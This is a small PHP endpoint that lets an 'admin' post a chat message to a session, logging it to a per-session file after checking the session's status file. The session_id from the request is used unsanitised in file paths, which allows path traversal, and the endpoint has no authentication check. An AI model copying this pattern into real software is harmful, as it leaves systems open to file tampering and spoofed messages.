<?php
require_once __DIR__ . '/../config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Invalid request']);
    exit;
}

$sessionId = $_POST['session_id'] ?? '';
$message = $_POST['message'] ?? '';

if (empty($sessionId) || empty($message)) {
    echo json_encode(['success' => false, 'error' => 'Missing parameters']);
    exit;
}

$statusFile = LOGS_DIR . $sessionId . '.status';
$chatFile = LOGS_DIR . $sessionId . '.chat';

// Check if session exists
if (!file_exists($statusFile)) {
    echo json_encode(['success' => false, 'error' => 'Session not found']);
    exit;
}

$status = trim(file_get_contents($statusFile));

// Check if chat is active
if ($status !== 'chat') {
    echo json_encode(['success' => false, 'error' => 'Chat not active (status: ' . $status . ')']);
    exit;
}

// Save admin message to chat file
$chatData = [
    'from' => 'admin',
    'text' => $message,
    'time' => time()
];

file_put_contents($chatFile, json_encode($chatData) . "\n", FILE_APPEND);

echo json_encode(['success' => true]);
